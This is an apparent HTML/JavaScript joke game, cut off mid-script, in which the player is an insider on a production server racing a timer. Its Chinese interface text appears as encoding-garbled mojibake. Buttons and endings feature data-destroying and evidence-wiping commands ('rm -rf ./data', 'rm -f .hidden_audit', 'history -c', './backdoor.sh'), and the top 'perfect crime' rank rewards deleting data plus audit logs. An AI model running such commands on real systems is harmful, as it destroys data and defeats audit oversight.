<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>âš¡ åˆ åº“è·‘è·¯ Â· æˆå°±ç³»ç»Ÿç‰ˆ</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Courier New', Courier, monospace;
        }
        body {
            background: linear-gradient(145deg, #0b1f1a 0%, #0a2a1f 100%);
            min-height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .game-container {
            max-width: 900px;
            width: 100%;
            background: #0f0e0b;
            border-radius: 24px;
            box-shadow: 0 20px 35px rgba(0,0,0,0.8), 0 0 0 2px #3a5f4b inset, 0 0 0 4px #1e332a inset;
            padding: 24px 20px 28px;
            border: 2px solid #6f8f72;
        }
        .terminal-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
            padding-left: 8px;
            border-bottom: 2px solid #3b6e4b;
            padding-bottom: 10px;
        }
        .terminal-header .dot {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background: #2e7d5a;
            box-shadow: 0 0 0 2px #5faa7a;
        }
        .terminal-header .dot.red {
            background: #ac4e3b;
            box-shadow: 0 0 0 2px #d47b62;
        }
        .terminal-header .dot.yellow {
            background: #c9a23b;
            box-shadow: 0 0 0 2px #ebc454;
        }
        .terminal-header .title {
            color: #b3f0c0;
            font-size: 1.4rem;
            font-weight: bold;
            letter-spacing: 2px;
            text-shadow: 0 0 5px #71c285;
            flex: 1;
            text-align: center;
            margin-right: 50px;
        }
        .screen {
            background: #0c1f17;
            border: 3px solid #3c6e51;
            border-radius: 18px;
            padding: 20px 18px;
            min-height: 360px;
            box-shadow: inset 0 0 25px #00000099, 0 0 0 2px #5d8867;
            color: #c6f7d0;
            font-size: 1.15rem;
            line-height: 1.6;
            white-space: pre-wrap;
            word-break: break-word;
            margin-bottom: 20px;
            overflow-y: auto;
            max-height: 400px;
            scroll-behavior: smooth;
        }
        .screen::-webkit-scrollbar {
            width: 8px;
            background: #193126;
        }
        .screen::-webkit-scrollbar-thumb {
            background: #45996b;
            border-radius: 30px;
        }
        .input-area {
            background: #0b1d13;
            border-radius: 60px;
            border: 3px solid #4a7b5c;
            display: flex;
            align-items: center;
            padding: 6px 18px;
            margin-top: 12px;
            box-shadow: 0 0 0 2px #1f4a30 inset;
        }
        .prompt {
            color: #d0ffb0;
            font-weight: bold;
            font-size: 1.5rem;
            margin-right: 10px;
            text-shadow: 0 0 8px #9affb0;
        }
        #commandInput {
            background: transparent;
            border: none;
            outline: none;
            color: #e3ffe7;
            font-size: 1.4rem;
            width: 100%;
            caret-color: #66ff99;
            font-family: 'Courier New', Courier, monospace;
            font-weight: 500;
        }
        #commandInput::placeholder {
            color: #456b52;
            font-size: 1.1rem;
            font-style: italic;
        }
        .button-grid {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            margin-top: 25px;
            justify-content: center;
        }
        .cmd-btn {
            background: #193d29;
            border: 2px solid #6cab7c;
            color: #dcffd3;
            font-size: 1.1rem;
            font-weight: bold;
            padding: 8px 18px;
            border-radius: 40px;
            cursor: pointer;
            transition: 0.15s;
            font-family: 'Courier New', monospace;
            box-shadow: 0 5px 0 #0e251a;
            text-transform: lowercase;
        }
        .cmd-btn:hover {
            background: #256b40;
            border-color: #9effb4;
            transform: translateY(-2px);
            box-shadow: 0 7px 0 #0e251a;
        }
        .cmd-btn:active {
            transform: translateY(4px);
            box-shadow: 0 2px 0 #0e251a;
        }
        .status-bar {
            display: flex;
            justify-content: space-between;
            color: #89f7b1;
            margin: 15px 5px 5px 5px;
            font-size: 1.2rem;
            font-weight: bold;
            background: #0f271b;
            padding: 8px 18px;
            border-radius: 40px;
            border: 1px solid #3f7854;
        }
        .danger {
            color: #ff907c;
            text-shadow: 0 0 5px #ff5f4a;
        }
        .warning {
            color: #ffb27a;
        }
        .safe {
            color: #c6f7d0;
        }
        .reset-link {
            text-align: right;
            margin-top: 10px;
        }
        .reset-link button {
            background: none;
            border: 2px solid #4e7760;
            color: #a8e6b3;
            font-size: 1rem;
            padding: 5px 18px;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.1s;
        }
        .reset-link button:hover {
            background: #2d5f40;
            color: white;
        }
        .footer-note {
            color: #50855e;
            text-align: center;
            margin-top: 12px;
            font-size: 0.9rem;
        }
        
        /* æˆå°±ç³»ç»Ÿæ ·å¼ */
        .achievement-panel {
            background: #0f271b;
            border: 2px solid #3f7854;
            border-radius: 16px;
            padding: 12px 16px;
            margin-bottom: 20px;
            color: #b3f0c0;
            font-size: 1rem;
        }
        .achievement-title {
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            font-weight: bold;
            font-size: 1.1rem;
            letter-spacing: 1px;
        }
        .achievement-title:hover {
            color: #e3ffe7;
        }
        .achievement-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 10px;
            margin-top: 15px;
        }
        .achievement-item {
            background: #0c1f17;
            border: 1px solid #2d6b42;
            border-radius: 12px;
            padding: 8px 4px;
            text-align: center;
            font-size: 0.9rem;
            transition: 0.1s;
        }
        .achievement-item.unlocked {
            background: #1f5a36;
            border-color: #a6ffb4;
            color: #e3ffe7;
            box-shadow: 0 0 8px #5aff8c;
        }
        .achievement-item .emoji {
            font-size: 1.5rem;
            display: block;
        }
        .achievement-item .name {
            font-weight: bold;
            font-size: 0.8rem;
        }
        .achievement-item .desc {
            font-size: 0.7rem;
            color: #89c297;
        }
        .achievement-item.unlocked .desc {
            color: #dcffd3;
        }
        .progress-bar {
            background: #0a1f15;
            height: 4px;
            border-radius: 4px;
            margin: 5px 0 0;
        }
        .progress-fill {
            background: #6eff96;
            height: 4px;
            border-radius: 4px;
            width: 0%;
        }
        .stats-row {
            display: flex;
            gap: 20px;
            margin-top: 8px;
            font-size: 0.9rem;
            color: #89f7b1;
        }
    </style>
</head>
<body>
<div class="game-container">
    <div class="terminal-header">
        <span class="dot red"></span>
        <span class="dot yellow"></span>
        <span class="dot"></span>
        <span class="title">rm -rf / â˜… æˆå°±ç³»ç»Ÿç‰ˆ</span>
    </div>

    <!-- æˆå°±é¢æ¿ï¼ˆå¯æŠ˜å ï¼‰ -->
    <div class="achievement-panel" id="achievementPanel">
        <div class="achievement-title" onclick="toggleAchievements()">
            <span>ğŸ† æˆå°±ç³»ç»Ÿ <span id="unlockCount">0/20</span></span>
            <span id="toggleIcon">â–¼</span>
        </div>
        <div id="achievementContent">
            <div class="stats-row">
                <span>ğŸƒ æ€»æ¸¸æˆæ¬¡æ•°: <span id="totalGames">0</span></span>
                <span>âœ¨ Sçº§ç»“å±€: <span id="sRankCount">0</span></span>
                <span>ğŸ’€ ä½œæ­»æ¬¡æ•°: <span id="deathCount">0</span></span>
            </div>
            <div class="achievement-grid" id="achievementGrid">
                <!-- æˆå°±å°†é€šè¿‡JSåŠ¨æ€ç”Ÿæˆ -->
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill" style="width: 0%;"></div>
            </div>
        </div>
    </div>

    <!-- ä¸»å±å¹•è¾“å‡º -->
    <div class="screen" id="outputScreen">
        > ç³»ç»Ÿå¯åŠ¨ä¸­...
        > æ‚¨å·²é€šè¿‡è·³æ¿æœºè¿æ¥åˆ°ç”Ÿäº§ç¯å¢ƒ [10.0.0.1]
        >
        âš ï¸  å½“å‰ç›®å½•: /data/production/db
        âš ï¸  è·ç¦»è‡ªåŠ¨å®¡è®¡æ—¥å¿—ä¸Šä¼ è¿˜å‰© 5 åˆ†é’Ÿ
        >
        è¾“å…¥æŒ‡ä»¤å¼€å§‹ä½ çš„åˆ åº“è·‘è·¯è®¡åˆ’...
    </div>

    <!-- è¾“å…¥è¡Œ -->
    <div class="input-area">
        <span class="prompt">$</span>
        <input type="text" id="commandInput" placeholder="è¾“å…¥å‘½ä»¤ (help / run / hide)" autofocus>
    </div>

    <!-- å¿«æ·æŒ‡ä»¤æŒ‰é’® -->
    <div class="button-grid">
        <button class="cmd-btn" data-cmd="ls -la">ğŸ“ ls -la</button>
        <button class="cmd-btn" data-cmd="rm -rf ./data">ğŸ’£ rm -rf ./data</button>
        <button class="cmd-btn" data-cmd="sudo su">ğŸ” sudo su</button>
        <button class="cmd-btn" data-cmd="cat config.json">ğŸ“„ cat config</button>
        <button class="cmd-btn" data-cmd="./backdoor.sh">ğŸ•³ï¸ run backdoor</button>
        <button class="cmd-btn" data-cmd="history">ğŸ“œ history</button>
        <button class="cmd-btn" data-cmd="rm -f .hidden_audit">ğŸ—‘ï¸ åˆ å®¡è®¡</button>
        <button class="cmd-btn" data-cmd="history -c">ğŸ§¹ æ¸…å†å²</button>
        <button class="cmd-btn" data-cmd="run">ğŸƒ è·‘è·¯ï¼</button>
        <button class="cmd-btn" data-cmd="hide">ğŸ‘» éšè”½</button>
        <button class="cmd-btn" data-cmd="achievements">ğŸ† æˆå°±</button>
    </div>

    <!-- çŠ¶æ€æ  / å±é™©å€¼ -->
    <div class="status-bar">
        <span>ğŸ”¥ é£é™©æŒ‡æ•°: <span id="riskValue" class="danger">15</span>%</span>
        <span>â³ å‰©ä½™æ—¶é—´: <span id="timerDisplay">5:00</span></span>
    </div>

    <!-- é‡ç½®æŒ‰é’® -->
    <div class="reset-link">
        <button id="resetBtn">âŸ² é‡æ–°è¿æ¥ (reset)</button>
        <button id="clearAchievementsBtn" style="margin-left: 10px; background: #3d2b2b; border-color: #aa6a6a;">ğŸ—‘ï¸ æ¸…ç©ºæˆå°±</button>
    </div>
    <div class="footer-note">[ åˆ åº“è·‘è·¯ æˆå°±ç‰ˆ ] â€” æˆå°±è¿›åº¦ä¿å­˜åœ¨æµè§ˆå™¨ä¸­ï¼</div>
</div>

<script>
    (function() {
        // ------ æ¸¸æˆçŠ¶æ€ ------
        let risk = 15;               // é£é™© 0% å®‰å…¨, 100% è§¦å‘å®¡è®¡/è¢«æŠ“
        let timeLeft = 300;          // å‰©ä½™ç§’æ•° (5åˆ†é’Ÿ = 300ç§’)
        let timerInterval = null;
        let gameOver = false;         // true è¡¨ç¤ºç»“å±€å·²è§¦å‘, ç¦æ­¢æ“ä½œ
        let finalMessageShown = false;
        let currentEnding = null;     // å½“å‰ç»“å±€ç±»å‹

        // æŒ‡ä»¤å†å²
        let commandHistory = [];

        // è§£é”äº‹ä»¶æ ‡è®°
        let secretBackdoorUsed = false;     // æ˜¯å¦æ‰§è¡Œè¿‡åé—¨
        let sudoObtained = false;           // æ˜¯å¦sudoææƒè¿‡
        let dataDeleted = false;            // æ˜¯å¦åˆ è¿‡dataç›®å½•
        let auditFileDeleted = false;       // æ˜¯å¦åˆ é™¤äº†å®¡è®¡æ–‡ä»¶
        let bashHistoryCleared = false;     // æ˜¯å¦æ¸…ç©ºäº†bashå†å²
        
        // åé—¨å½©è›‹æ ‡è®°
        let backdoorEasterEggTriggered = false;
        
        // éšè”½æ¬¡æ•°
        let hideCount = 0;
        
        // å½©è›‹ç›¸å…³
        let backdoorChoice = null;          // åé—¨é€‰æ‹©: 'continue' æˆ– 'cut'
        
        // æ˜¯å¦æ˜¾ç¤ºè¿‡é£é™©è­¦å‘Š
        let highRiskWarningShown = false;

        // DOM å…ƒç´ 
        const outputEl = document.getElementById('outputScreen');
        const inputEl = document.getElementById('commandInput');
        const riskSpan = document.getElementById('riskValue');
        const timerSpan = document.getElementById('timerDisplay');
        const resetBtn = document.getElementById('resetBtn');
        const clearAchievementsBtn = document.getElementById('clearAchievementsBtn');

        // ------ æˆå°±ç³»ç»Ÿ ------
        const ACHIEVEMENTS = [
            { id: 'first_timer', name: 'åˆæ¬¡è·‘è·¯', emoji: 'ğŸƒ', desc: 'å®Œæˆä¸€å±€æ¸¸æˆ', unlocked: false },
            { id: 'data_deleted', name: 'åˆ åº“ä¸“å®¶', emoji: 'ğŸ’£', desc: 'åˆ é™¤dataç›®å½•', unlocked: false },
            { id: 'sudo_root', name: 'æƒé™ç‹—', emoji: 'ğŸ”', desc: 'è·å¾—rootæƒé™', unlocked: false },
            { id: 'audit_clean', name: 'ä¸ç•™ç—•è¿¹', emoji: 'ğŸ§¹', desc: 'åˆ é™¤å®¡è®¡æ—¥å¿—', unlocked: false },
            { id: 'history_clean', name: 'å¤±å¿†ç—‡', emoji: 'ğŸ“œ', desc: 'æ¸…ç©ºå‘½ä»¤å†å²', unlocked: false },
            { id: 'backdoor_used', name: 'èµ°åé—¨', emoji: 'ğŸ•³ï¸', desc: 'æ‰§è¡Œåé—¨è„šæœ¬', unlocked: false },
            { id: 'backdoor_cut', name: 'è¿·é€”çŸ¥è¿”', emoji: 'ğŸ”Œ', desc: 'åˆ‡æ–­åé—¨é€ƒç”Ÿ', unlocked: false },
            { id: 'backdoor_continue', name: 'å¤´é“å¨ƒ', emoji: 'ğŸ’€', desc: 'ç»§ç»­åé—¨ä½œæ­»', unlocked: false },
            { id: 'hide_master', name: 'èº²çŒ«çŒ«é«˜æ‰‹', emoji: 'ğŸ‘»', desc: 'ä½¿ç”¨3æ¬¡éšè”½', unlocked: false },
            { id: 'perfect_crime', name: 'å®Œç¾çŠ¯ç½ª', emoji: 'âœ¨', desc: 'Sçº§ç»“å±€', unlocked: false },
            { id: 'caught', name: 'å½“åœºæŠ“è·', emoji: 'ğŸš¨', desc: 'é£é™©100%è¢«æŠ“', unlocked: false },
            { id: 'timeout', name: 'æ‹–å»¶ç—‡', emoji: 'â°', desc: 'æ—¶é—´è€—å°½è¢«æŠ“', unlocked: false },
            { id: 'fugitive', name: 'äº¡å‘½å¤©æ¶¯', emoji: 'ğŸƒâ€â™‚ï¸', desc: 'Bçº§ç»“å±€ï¼ˆè¯æ®æœªæ¶ˆï¼‰', unlocked: false },
            { id: 'almost_perfect', name: 'å·®ä¸€ç‚¹ç‚¹', emoji: 'ğŸ”’', desc: 'Açº§ç»“å±€', unlocked: false },
            { id: 'coward', name: 'æ‡¦å¤«', emoji: 'ğŸ˜¨', desc: 'ä»€ä¹ˆéƒ½æ²¡å¹²å°±è·‘è·¯', unlocked: false },
            { id: 'cat_config', name: 'çª¥æ¢è€…', emoji: 'ğŸ‘€', desc: 'æŸ¥çœ‹config.json', unlocked: false },
            { id: 'cat_secret', name: 'è§£å¯†å¤§å¸ˆ', emoji: 'ğŸ”‘', desc: 'æŸ¥çœ‹secret.db', unlocked: false },
            { id: 'cat_backdoor', name: 'è„šæœ¬å°å­', emoji: 'ğŸ“', desc: 'æŸ¥çœ‹backdoor.sh', unlocked: false },
            { id: 'rm_root', name: 'ä½œæ­»å°èƒ½æ‰‹', emoji: 'ğŸ’¥', desc: 'å°è¯•rm -rf /', unlocked: false },
            { id: 'survivor', name: 'æé™é€ƒç”Ÿ', emoji: 'ğŸ¯', desc: 'é£é™©99%æ—¶è·‘è·¯æˆåŠŸ', unlocked: false }
        ];

        // ç»Ÿè®¡æ•°æ®
        let stats = {
            totalGames: 0,
            sRankCount: 0,
            deathCount: 0,
            aRankCount: 0,
            bRankCount: 0
        };

        // ä»CookieåŠ è½½æˆå°±
        function loadAchievements() {
            const cookies = document.cookie.split(';');
            let achievementsData = null;
            let statsData = null;
            
            for (let cookie of cookies) {
                const [name, value] = cookie.trim().split('=');
                if (name === 'sg_achievements') {
                    achievementsData = decodeURIComponent(value);
                } else if (name === 'sg_stats') {
                    statsData = decodeURIComponent(value);
                }
            }
            
            if (achievementsData) {
                try {
                    const unlockedIds = JSON.parse(achievementsData);
                    ACHIEVEMENTS.forEach(ach => {
                        ach.unlocked = unlockedIds.includes(ach.id);
                    });
                } catch (e) {
                    console.error('åŠ è½½æˆå°±å¤±è´¥', e);
                }
            }
            
            if (statsData) {
                try {
                    stats = JSON.parse(statsData);
                } catch (e) {
                    console.error('åŠ è½½ç»Ÿè®¡å¤±è´¥', e);
                }
            }
            
            updateAchievementDisplay();
        }

        // ä¿å­˜æˆå°±åˆ°Cookie
        function saveAchievements() {
            const unlockedIds = ACHIEVEMENTS.filter(ach => ach.unlocked).map(ach => ach.id);
            const expiryDate = new Date();
            expiryDate.setFullYear(expiryDate.getFullYear() + 1); // ä¿å­˜1å¹´
            
            document.cookie = `sg_achievements=${encodeURIComponent(JSON.stringify(unlockedIds))}; expires=${expiryDate.toUTCString()}; path=/`;
            document.cookie = `sg_stats=${encodeURIComponent(JSON.stringify(stats))}; expires=${expiryDate.toUTCString()}; path=/`;
            
            updateAchievementDisplay();
        }

        // è§£é”æˆå°±
        function unlockAchievement(id) {
            const achievement = ACHIEVEMENTS.find(a => a.id === id);
            if (achievement && !achievement.unlocked) {
                achievement.unlocked = true;
                printToScreen(`\nğŸ† æˆå°±è§£é”: ${achievement.emoji} ${achievement.name} - ${achievement.desc}`);
                saveAchievements();
            }
        }

        // æ›´æ–°æˆå°±æ˜¾ç¤º
        function updateAchievementDisplay() {
            const grid = document.getElementById('achievementGrid');
            if (!grid) return;
            
            let html = '';
            ACHIEVEMENTS.forEach(ach => {
                html += `
                    <div class="achievement-item ${ach.unlocked ? 'unlocked' : ''}">
                        <span class="emoji">${ach.emoji}</span>
                        <span class="name">${ach.name}</span>
                        <span class="desc">${ach.desc}</span>
                    </div>
                `;
            });
            grid.innerHTML = html;
            
            const unlockedCount = ACHIEVEMENTS.filter(a => a.unlocked).length;
            document.getElementById('unlockCount').innerText = `${unlockedCount}/${ACHIEVEMENTS.length}`;
            
            const progress = (unlockedCount / ACHIEVEMENTS.length) * 100;
            document.getElementById('progressFill').style.width = progress + '%';
            
            // æ›´æ–°ç»Ÿè®¡æ˜¾ç¤º
            document.getElementById('totalGames').innerText = stats.totalGames;
            document.getElementById('sRankCount').innerText = stats.sRankCount;
            document.getElementById('deathCount').innerText = stats.deathCount;
        }

        // æ¸…ç©ºæˆå°±
        function clearAchievements() {
            if (confirm('ç¡®å®šè¦æ¸…ç©ºæ‰€æœ‰æˆå°±å—ï¼Ÿ')) {
                ACHIEVEMENTS.forEach(ach => ach.unlocked = false);
                stats = { totalGames: 0, sRankCount: 0, deathCount: 0, aRankCount: 0, bRankCount: 0 };
                saveAchievements();
                updateAchievementDisplay();
                printToScreen('ğŸ—‘ï¸ æˆå°±æ•°æ®å·²æ¸…ç©º');
            }
        }

        // è¾…åŠ©å‡½æ•°: è¾“å‡ºåˆ°å±å¹•
        function printToScreen(text, isCommand = false) {
            if (isCommand) {
                outputEl.innerHTML += `\n> <span style="color:#c2f2b0;">$ ${text}</span>`;
            } else {
                outputEl.innerHTML += `\n${text}`;
            }
            outputEl.scrollTop = outputEl.scrollHeight;
        }

        // é‡ç½®å±å¹•
        function resetScreenWithWelcome() {
            outputEl.innerHTML = `> ç³»ç»Ÿå¯åŠ¨ä¸­...
> æ‚¨å·²é€šè¿‡è·³æ¿æœºè¿æ¥åˆ°ç”Ÿäº§ç¯å¢ƒ [10.0.0.1]

âš ï¸  å½“å‰ç›®å½•: /data/production/db
âš ï¸  è·ç¦»è‡ªåŠ¨å®¡è®¡æ—¥å¿—ä¸Šä¼ è¿˜å‰© 5 åˆ†é’Ÿ

è¾“å…¥æŒ‡ä»¤å¼€å§‹ä½ çš„åˆ åº“è·‘è·¯è®¡åˆ’...`;
        }

        // æ›´æ–°é£é™©æ˜¾ç¤º
        function updateRisk(value) {
            risk = Math.min(100, Math.max(0, value));
            riskSpan.innerText = risk + '%';
            
            if (risk >= 90) {
                riskSpan.style.color = '#ff5f4a';
                riskSpan.style.textShadow = '0 0 8px red';
                riskSpan.className = 'danger';
                
                if (risk >= 95 && !gameOver && !highRiskWarningShown) {
                    printToScreen('âš ï¸âš ï¸âš ï¸ é£é™©æé«˜ï¼å»ºè®®ç«‹å³è·‘è·¯ï¼è¾“å…¥ run é€ƒè·‘ âš ï¸âš ï¸âš ï¸');
                    highRiskWarningShown = true;
                }
            } else if (risk >= 70) {
                riskSpan.style.color = '#ffb27a';
                riskSpan.style.textShadow = 'none';
                riskSpan.className = 'warning';
                highRiskWarningShown = false;
            } else {
                riskSpan.style.color = '#c6f7d0';
                riskSpan.style.textShadow = 'none';
                riskSpan.className = 'safe';
                highRiskWarningShown = false;
            }
        }

        // æ›´æ–°æ—¶é—´æ˜¾ç¤º
        function updateTimerDisplay() {
            const mins = Math.floor(timeLeft / 60);
            const secs = timeLeft % 60;
            timerSpan.innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
        }

        // åé—¨å½©è›‹
        function triggerBackdoorEasterEgg() {
            if (backdoorEasterEggTriggered || gameOver) return;
            
            backdoorEasterEggTriggered = true;
            
            let eggMessage = `
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                          â•‘
â•‘   ğŸ¥š  ã€éšè—å½©è›‹ï¼šåé—¨é€ƒäº¡ã€‘  ğŸ¥š                         â•‘
â•‘                                                          â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘                                                          â•‘
â•‘   (è¿œå¤„ä¼ æ¥è­¦ç¬›å£°ï¼Œä½†ä½ å·²ä»åé—¨æºœèµ°äº†ä¸€åŠ...)             â•‘
â•‘                                                          â•‘
â•‘   ä½ é€šè¿‡åé—¨è¿æ¥åˆ°äº†å¤–éƒ¨æœåŠ¡å™¨ï¼Œä½†å®¡è®¡ç³»ç»Ÿå·²ç»é”å®šä½ çš„     â•‘
â•‘   åŸå§‹è¿æ¥ã€‚ç°åœ¨ä½ æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼š                           â•‘
â•‘                                                          â•‘
â•‘   1. ç»§ç»­é€šè¿‡åé—¨è¿œç¨‹æ“ä½œ (é£é™©+30)                      â•‘
â•‘   2. åˆ‡æ–­åé—¨ï¼Œå°±åœ°éšè— (é£é™©-20)                        â•‘
â•‘                                                          â•‘
â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
â•‘                                                          â•‘
â•‘   è¾“å…¥å‘½ä»¤ç»§ç»­å‰§æƒ…ï¼š                                      â•‘
â•‘   â–¸ ç»§ç»­åé—¨ è¾“å…¥: continue_backdoor                     â•‘
â•‘   â–¸ åˆ‡æ–­åé—¨ è¾“å…¥: cut_backdoor                          â•‘
â•‘                                                          â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•`;
            
            printToScreen(eggMessage);
        }

        // æ¸¸æˆç»“æŸ
        function triggerEnding(message, isSuccess = false) {
            if (gameOver) return;
            
            // å¢åŠ æ¸¸æˆæ¬¡æ•°
            stats.totalGames++;
            
            let endingMsg = message;
            let endingType = 'unknown';
            
            if (!message) {
                if (risk >= 100) {
                    endingMsg = 'ğŸš¨ é£é™©æŒ‡æ•° 100% â€”â€” å…¥ä¾µæ£€æµ‹ç³»ç»Ÿè§¦å‘ï¼Œç®¡ç†å‘˜é”å®šäº†ä½ çš„ä¼šè¯ã€‚\nğŸ«¤ ä½ è¢«å½“åœºæŠ“è·ã€‚ç»“å±€: åˆ åº“å¤±è´¥ + é“¶æ‰‹é•¯ã€‚';
                    endingType = 'caught';
                    stats.deathCount++;
                    unlockAchievement('caught');
                }
                else if (timeLeft <= 0) {
                    endingMsg = 'â° 5åˆ†é’Ÿå·²åˆ°ï¼Œå®¡è®¡äººå‘˜æ¨é—¨è€Œå…¥ï¼Œä½ è¿˜åœ¨æ•²é”®ç›˜ã€‚\nğŸ‘® è·‘è·¯è®¡åˆ’ç ´äº§ã€‚';
                    endingType = 'timeout';
                    stats.deathCount++;
                    unlockAchievement('timeout');
                }
                else if (dataDeleted && auditFileDeleted && bashHistoryCleared) {
                    endingMsg = 'âœ¨âœ¨ å®Œç¾çŠ¯ç½ªï¼ âœ¨âœ¨\n\nä½ ä¸ä»…åˆ é™¤äº†æ ¸å¿ƒæ•°æ®ï¼Œè¿˜æ¸…ç©ºäº†æ‰€æœ‰å®¡è®¡æ—¥å¿—å’Œå†å²è®°å½•ã€‚\nä¸‰å¤©åï¼Œå½“ç®¡ç†å‘˜å‘ç°æ•°æ®ä¸¢å¤±æ—¶ï¼Œæ²¡æœ‰ä»»ä½•çº¿ç´¢æŒ‡å‘ä½ ã€‚\nä½ åœ¨æ–°çš„åŸå¸‚å¼€å§‹äº†å¹³é™çš„ç”Ÿæ´»...\n\nã€ç»“å±€ï¼šå®Œç¾çŠ¯ç½ª Â· Sçº§ã€‘';
                    endingType = 's_rank';
                    stats.sRankCount++;
                    unlockAchievement('perfect_crime');
                    
                    // å¦‚æœé£é™©99%è·‘è·¯ï¼Œé¢å¤–è§£é”
                    if (risk >= 99) {
                        unlockAchievement('survivor');
                    }
                }
                else if (dataDeleted && auditFileDeleted) {
                    endingMsg = 'ğŸ”’ æ•°æ®å·²åˆ é™¤ï¼Œå®¡è®¡æ—¥å¿—ä¹Ÿå·²æ¸…ç©ºï¼Œä½†å‘½ä»¤å†å²å¯èƒ½è¿˜ç•™ä¸‹ç—•è¿¹ã€‚\nä½ åŒ†åŒ†é€ƒç¦»ï¼Œå¿ƒä¸­éšéšä¸å®‰...\n\nã€ç»“å±€ï¼šå‡ ä¹å®Œç¾ Â· Açº§ã€‘';
                    endingType = 'a_rank';
                    stats.aRankCount++;
                    unlockAchievement('almost_perfect');
                }
                else if (dataDeleted && risk < 60) {
                    endingMsg = 'âš ï¸ ä½ æˆåŠŸåˆ é™¤æ ¸å¿ƒæ•°æ®ï¼Œè¶ä¹±æºœå‡ºåé—¨ï¼Œæ¶ˆå¤±åœ¨äººç¾¤ä¸­...\n\nä½†æ“ä½œæ—¥å¿—è¿˜åœ¨æœåŠ¡å™¨ä¸Šï¼è­¦å¯Ÿé¡ºç€æ—¥å¿—å¾ˆå¿«å°±èƒ½æ‰¾åˆ°ä½ ã€‚\n\nã€ç»“å±€ï¼šé€ƒçŠ¯ Â· Bçº§ã€‘ï¼ˆè¯æ®æœªæ¸…ç†ï¼‰';
                    endingType = 'b_rank';
                    stats.bRankCount++;
                    unlockAchievement('fugitive');
                }
                else {
                    endingMsg = 'ğŸ’¥ æ¸¸æˆæ„å¤–ç»“æŸã€‚';
                }
            } else {
                // è‡ªå®šä¹‰ç»“å±€æ¶ˆæ¯
                if (message.includes('è·‘è·¯æˆåŠŸ')) {
                    endingType = 's_rank';
                    stats.sRankCount++;
                    unlockAchievement('perfect_crime');
                } else if (message.includes('æ‡¦å¤«')) {
                    endingType = 'coward';
                    unlockAchievement('coward');
                }
            }
            
            currentEnding = endingType;
            
            outputEl.innerHTML += `\n==========================================\n${endingMsg}\n==========================================`;
            
            gameOver = true;
            finalMessageShown = true;
            
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
            
            inputEl.disabled = true;
            inputEl.placeholder = 'æ¸¸æˆç»“æŸï¼ŒæŒ‰é‡ç½®ç»§ç»­';
            
            // ä¿å­˜æˆå°±
            saveAchievements();
        }

        // æ£€æŸ¥å¤±è´¥æ¡ä»¶
        function checkFailureCondition() {
            if (gameOver) return true;
            if (risk >= 100) {
                triggerEnding();
                return true;
            }
            if (timeLeft <= 0) {
                triggerEnding();
                return true;
            }
            return false;
        }

        // å¤„ç†æ¯ä¸ªå‘½ä»¤
        function processCommand(cmd) {
            if (gameOver) {
                printToScreen('ç³»ç»Ÿå·²é”å®šã€‚æŒ‰ã€Œé‡æ–°è¿æ¥ã€å¼€å§‹æ–°æ¸¸æˆã€‚');
                return;
            }

            const originalCmd = cmd;
            const lowerCmd = cmd.toLowerCase().trim();
            if (lowerCmd === '') return;

            // è®°å½•å†å²
            commandHistory.push(originalCmd);
            if (commandHistory.length > 12) commandHistory.shift();

            // æ‰“å°ç”¨æˆ·è¾“å…¥
            printToScreen(originalCmd, true);

            // è§£æå‘½ä»¤
            const parts = originalCmd.trim().split(' ');
            const baseCmd = parts[0].toLowerCase();

            // æˆå°±å‘½ä»¤
            if (baseCmd === 'achievements' || baseCmd === 'æˆå°±') {
                let achMsg = '\nğŸ† å·²è§£é”æˆå°±:\n';
                const unlocked = ACHIEVEMENTS.filter(a => a.unlocked);
                if (unlocked.length === 0) {
                    achMsg += '  æš‚æ— æˆå°±ï¼Œå¼€å§‹æ¸¸æˆå§ï¼';
                } else {
                    unlocked.forEach(a => {
                        achMsg += `  ${a.emoji} ${a.name} - ${a.desc}\n`;
                    });
                }
                achMsg += `\nğŸ“Š æ€»è¿›åº¦: ${unlocked.length}/${ACHIEVEMENTS.length}`;
                printToScreen(achMsg);
                return;
            }

            // è·‘è·¯å‘½ä»¤
            if (baseCmd === 'run' || baseCmd === 'escape' || baseCmd === 'è·‘è·¯') {
                if (dataDeleted) {
                    if (auditFileDeleted && bashHistoryCleared) {
                        printToScreen('ğŸƒâ€â™‚ï¸ ä½ è¶ç€å®¡è®¡ç³»ç»Ÿè¿˜æ²¡ååº”è¿‡æ¥ï¼Œæ‹”æ‰ç½‘çº¿å°±è·‘ï¼');
                        printToScreen('ä¸‰å¤©åï¼Œä½ åœ¨è€å®¶æ¥åˆ°ç”µè¯ï¼š"æ•°æ®ä¸¢äº†ï¼Œæ˜¯ä½ å¹²çš„å—ï¼Ÿ"');
